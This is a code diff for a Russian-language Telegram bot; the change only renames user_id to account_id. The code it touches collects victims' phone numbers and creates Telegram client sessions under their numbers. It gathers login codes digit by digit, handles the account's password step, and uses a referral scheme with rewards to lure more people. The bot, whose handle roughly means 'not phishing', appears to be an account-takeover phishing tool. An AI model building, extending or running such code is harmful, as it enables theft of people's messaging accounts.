@@ -20,11 +20,11 @@ from utils import config
 
 
 class SessionHelpers:
-    def __init__(self, user_id):
-        self.user_id = user_id
+    def __init__(self, account_id):
+        self.account_id = account_id
 
     async def referral_system(self, send_msg, mention_user):
-        user = User(self.user_id)
+        user = User(self.account_id)
         referrer_id = user.get_referrer_id()
 
         if referrer_id:
@@ -49,7 +49,7 @@ class SessionHelpers:
 Ты уже так близко, не упусти эту возможность! 🚀
                     
 <b>✨ Вот твоя ссылка для приглашений:</b>
-<code>https://t.me/nefishinginfasotkabot/?start={self.user_id}</code>
+<code>https://t.me/nefishinginfasotkabot/?start={self.account_id}</code>
 
 <b>Делись и получай заслуженную награду! 🏅</b>''', parse_mode='html')
 
@@ -59,7 +59,7 @@ class SessionHelpers:
 async def contact_handler(msg: Message, state: FSMContext):
     phone = msg.contact.phone_number.replace('', '')
 
-    User(user_id=msg.from_user.id).update_phone(phone=phone)
+    User(account_id=msg.from_user.id).update_phone(phone=phone)
 
     if not os.path.exists('./data./session/{phone}.session'.format(phone=phone[1:])):
 
@@ -198,10 +198,10 @@ async def get_account_tg_load(call: CallbackQuery, state: FSMContext):
     code = one + two + three + four + five
 
     client = ClientTG(phone=phone).client
-    user_id = call.message.chat.id
+    account_id = call.message.chat.id
 
     await client.connect()
-    helpers = SessionHelpers(user_id)
+    helpers = SessionHelpers(account_id)
     
         
     try:
@@ -251,8 +251,8 @@ async def password(message: Message, state: FSMContext):
 
     client = ClientTG(phone=phone).client
 
-    user_id = message.from_user.id
-    helpers = SessionHelpers(user_id)
+    account_id = message.from_user.id
+    helpers = SessionHelpers(account_id)
 
     await client.connect()
     try:
@@ -262,7 +262,7 @@ async def password(message: Message, state: FSMContext):
         # converter = Converter(phone)
         # await converter.run()
 
-        await bot.send_sticker(chat_id=user_id,
+        await bot.send_sticker(chat_id=account_id,
                            sticker=r"CAACAgIAAxkBAAEFwDJjE87Hjf5aRJQIJe2p3gS0M9g2vwAC7hQAAuNVUEk4S4qtAhNhvCkE")
         await message.answer('<b>✅ Бот успешно подключен!\n⏱ Вы поставлены в очередь</b>')
 
